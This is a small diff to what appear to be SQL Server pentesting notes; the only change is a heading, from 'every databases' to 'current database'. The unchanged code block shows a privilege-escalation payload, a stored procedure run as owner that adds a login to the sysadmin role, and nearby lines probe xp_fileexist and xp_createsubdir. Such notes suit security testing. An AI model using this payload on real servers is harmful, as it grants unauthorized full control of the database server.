@@ -150,7 +150,7 @@ Result
 * Can you check if a file exist thanks to xp_fileexist?
 * Can you create a folder with xp_createsubdir?
 
-### Create a stored procedure in every databases
+### Create a stored procedure in current database
 ```
 CREATE PROCEDURE IMDATELOHJOSUUSOOJAHMSAT WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'bruno','sysadmin'
 ```
